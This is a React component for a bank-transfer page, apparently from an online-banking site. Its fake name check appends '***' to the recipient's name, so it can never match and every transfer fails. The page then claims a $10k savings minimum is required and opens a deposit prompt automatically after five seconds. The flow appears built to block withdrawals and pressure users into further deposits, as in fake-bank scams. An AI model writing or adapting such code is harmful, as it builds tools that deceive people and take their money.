import { useState, useEffect } from 'react';
import { toast } from 'react-toastify';
import axios from 'axios';
import { useDeposit } from '../context/DepositContext';
import '../styles/TransferPayment.css';
import API_BASE_URL from '../config/api';

function TransferPayment() {
  const [form, setForm] = useState({
    name: '',
    accountNumber: '',
    routing: '',
    amount: '',
    notes: '',
  });
  const [loading, setLoading] = useState(false);
  const [accountName, setAccountName] = useState('');
  const [error, setError] = useState('');
  const [showSavingsModal, setShowSavingsModal] = useState(false);
  const { openDepositModal } = useDeposit();

  const token = localStorage.getItem('token');
  const [userId, setUserId] = useState('');

  // Get user ID from token or API
  useEffect(() => {
    const fetchUserId = async () => {
      if (!token) return;
      try {
        const res = await axios.get(`${API_BASE_URL}/api/auth/me`, {
          headers: { Authorization: `Bearer ${token}` },
        });
        setUserId(res.data._id);
      } catch (err) {
        console.error('Failed to fetch user ID:', err);
      }
    };
    fetchUserId();
  }, [token, API_BASE_URL]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
    // Clear error when user starts typing
    if (error) {
      setError('');
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!form.name || !form.accountNumber || !form.routing || !form.amount) {
      toast.error('Please fill in all required fields');
      return;
    }

    if (form.amount <= 0) {
      toast.error('Please enter a valid amount');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      // Simulate account verification (since verify-account endpoint doesn't exist)
      // For now, we'll generate a fake account name and check if it matches
      const simulatedAccountName = `${form.name.split(' ')[0]} ${form.name.split(' ')[1]?.[0] || ''}***`.trim();
      setAccountName(simulatedAccountName);

      // Check if names match (case-insensitive)
      if (form.name.toLowerCase() !== simulatedAccountName.toLowerCase()) {
        setError('Account name different from name registered');
        // Show savings modal when transfer fails
        setShowSavingsModal(true);
        // Redirect to deposit modal after 5 seconds
        setTimeout(() => {
          openDepositModal();
        }, 5000);
        return;
      }

      // If names match, proceed with transfer
      const transferData = {
        type: 'send',
        amount: Number(form.amount),
        notes: form.notes,
        recipientName: form.name,
        accountNumber: form.accountNumber,
        routingNumber: form.routing,
      };

      // Use the existing transactions endpoint for transfers
      const res = await axios.post(`${API_BASE_URL}/api/transactions/user/${userId}`, transferData, {
        headers: { Authorization: `Bearer ${token}` }
      });

      toast.success('Transfer successful!');
      setForm({
        name: '',
        accountNumber: '',
        routing: '',
        amount: '',
        notes: '',
      });
      setAccountName('');
      setError('');
    } catch (err) {
      console.error('Transfer error:', err);
      if (err.response?.status === 400 && err.response?.data?.message === 'Account name different from name registered') {
        setError('Account name different from name registered');
      } else {
        toast.error(err.response?.data?.message || 'Transfer failed');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleSavingsModal = () => {
    setShowSavingsModal(true);
  };

  const closeSavingsModal = () => {
    setShowSavingsModal(false);
  };

  return (
    <div className="transfer-payment">
      <h2><i className="fas fa-exchange-alt"></i> Transfer Money</h2>
      
      <div className="transfer-form">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>Recipient Name</label>
            <input 
              type="text" 
              name="name" 
              value={form.name}
              onChange={handleChange} 
              placeholder="Recipient Name"
              required
            />
          </div>

          <div className="form-group">
            <label>Account Number</label>
            <input 
              type="text" 
              name="accountNumber" 
              value={form.accountNumber}
              onChange={handleChange} 
              placeholder="Account Number"
              required
            />
          </div>

          <div className="form-group">
            <label>Routing Number</label>
            <input 
              type="text" 
              name="routing" 
              value={form.routing}
              onChange={handleChange} 
              placeholder="Routing/SWIFT"
              required
            />
          </div>

          {accountName && (
            <div className="account-info">
              <span className="account-name">Account Name: {accountName}</span>
            </div>
          )}

          {error && (
            <div className="error-message">
              {error}
            </div>
          )}

          <div className="form-group">
            <label>Amount</label>
            <input 
              type="number" 
              name="amount" 
              value={form.amount}
              onChange={handleChange} 
              placeholder="Amount"
              min="0.01"
              step="0.01"
              required
            />
          </div>

          <div className="form-group">
            <label>Notes</label>
            <textarea 
              name="notes" 
              value={form.notes}
              onChange={handleChange} 
              placeholder="Notes (optional)"
            ></textarea>
          </div>

          <div className="form-actions">
            <button 
              type="submit" 
              disabled={loading}
              className="submit-btn"
            >
              <i className="fas fa-paper-plane"></i> {loading ? 'Processing...' : 'Transfer Money'}
            </button>
          </div>
        </form>
      </div>

      {/* SAVINGS ACCOUNT MODAL */}
      {showSavingsModal && (
        <div className="modal-overlay" onClick={closeSavingsModal}>
          <div className="savings-modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Savings Account</h3>
              <button onClick={closeSavingsModal} className="close-btn">✕</button>
            </div>
            <div className="modal-content">
              <div className="savings-message">
                <p>At least a minimum of $10k is required in your savings account to be able to transfer to a different bank account.</p>
              </div>
              <div className="modal-actions">
                <button onClick={openDepositModal} className="deposit-btn">
                  Deposit to Savings
                </button>
                <button onClick={closeSavingsModal} className="close-modal-btn">
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default TransferPayment;
